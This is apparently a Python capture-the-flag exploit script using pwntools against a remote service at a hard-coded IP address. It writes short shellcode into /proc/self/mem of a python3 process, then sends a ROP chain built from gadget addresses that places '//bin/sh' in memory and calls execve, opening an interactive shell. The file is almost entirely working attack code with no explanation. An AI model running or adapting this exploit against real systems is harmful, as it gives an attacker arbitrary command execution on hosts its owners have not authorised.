#!/usr/bin/python2
#-*- coding:utf-8 -*-

from pwn import *
from pwn import sleep
context.log_level = "critical"
context.binary = "/usr/bin/python3"
elf = context.binary

#  io = process("./abw")
io = remote("34.82.101.212", 10010)

io.sendlineafter(" :", "/proc/self/mem")

offset = 0x4b0f80
io.sendlineafter(" :", str(offset))

#  gdb.attach(io, '''b *0x4b0f78\nc''')
data = asm('''
        mov rsi, rsp
        mov rdx, r12
        pop rdi
        syscall
        ret
        ''').encode('hex')
print(len(data))
assert len(data) <= 20
io.sendlineafter(":", data)
sleep(0.01)

from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 577e6f13d080302dd4c6e653134fee0234c7b4b4a9b03c849f6d0b176aa379b2
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''
rop += 'padding\0'

rop += rebase_0(0x0000000000020d7c) # 0x0000000000420d7c: pop r13; ret;
rop += '//bin/sh'
rop += rebase_0(0x0000000000020bb0) # 0x0000000000420bb0: pop r12; ret;
rop += rebase_0(0x00000000005b4ea0)
rop += rebase_0(0x000000000015c64d) # 0x000000000055c64d: mov qword ptr [r12], r13; pop r12; pop r13; pop r14; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000020d7c) # 0x0000000000420d7c: pop r13; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000020bb0) # 0x0000000000420bb0: pop r12; ret;
rop += rebase_0(0x00000000005b4ea8)
rop += rebase_0(0x000000000015c64d) # 0x000000000055c64d: mov qword ptr [r12], r13; pop r12; pop r13; pop r14; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000021872) # 0x0000000000421872: pop rdi; ret;
rop += rebase_0(0x00000000005b4ea0)
rop += rebase_0(0x000000000002159a) # 0x000000000042159a: pop rsi; ret;
rop += rebase_0(0x00000000005b4ea8)
rop += rebase_0(0x00000000000026c1) # 0x00000000004026c1: pop rdx; ret;
rop += rebase_0(0x00000000005b4ea8)
rop += rebase_0(0x0000000000021095) # 0x0000000000421095: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000009a009) # 0x000000000049a009: syscall;
io.sendline(rop)

io.interactive()
